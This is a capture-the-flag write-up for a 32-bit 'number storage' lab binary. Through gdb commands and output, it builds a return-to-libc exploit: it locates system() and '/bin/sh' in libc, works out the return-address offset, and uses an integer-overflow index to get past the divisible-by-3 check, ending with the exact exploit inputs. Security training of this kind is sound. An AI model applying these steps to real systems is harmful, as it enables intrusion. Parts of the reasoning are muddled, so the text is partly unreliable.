This binary provides a simple number storing interface with three commands:

store, saves input number (int == 4 bytes) at input index (offset = index * 4).
read, display number stored at input index.
quit, exit the program.

The store function has two conditions, it has to be stored at an index divisible by 3 and when right byte shifted by 0x18 (24) is equal to 0xb7 (183).

let's use gdb to to re Ret2Lib attack:

(gdb) b *0x08048636 ; sets a breakpoint in the store_number function
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()

(gdb) x $ebp+0x8 ; examining the value stored to control the return adress
0xffffd4c0:	0xffffd4e4

(gdb) info function puts ; getting the address of the puts function of the libc to use as part of the ret2lib attack
0x080484c0  puts

(gdb) info proc map

lists various mapped address spaces, including the address spaces of the executable program and its dynamically linked libraries. To perform a Return-to-Libc attack, you typically want to target a library function. In this case, it's the system function.

0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec

(gdb) info functions system ; to get 
0xf7e6aed0  system

examining the value at the top of the stack ($esp). The value is 0xf7e45513, which could be an address or an argument for a function call.
(gdb) b *0x080489f1 
(gdb) c ; continue

Address of "/bin/sh" 0xf7f897ec = 4160264172 address of system 0xf7e6aed0 = 4159090384 EIP Offset 0xffffd5c8 - 0xffffd400 = 456 so 114

114 modulo 3 equals to 0 s so we can't use it directly

(gdb) x/wx $esp
0xffffd5c8:	0xf7e45513

let's overflow the uint32
0xffffffff / 4 + 114 + 1 = 1073741938

Number : 4160264172 Index : 116 Number : 4159090384 Index : 1073741938

quit
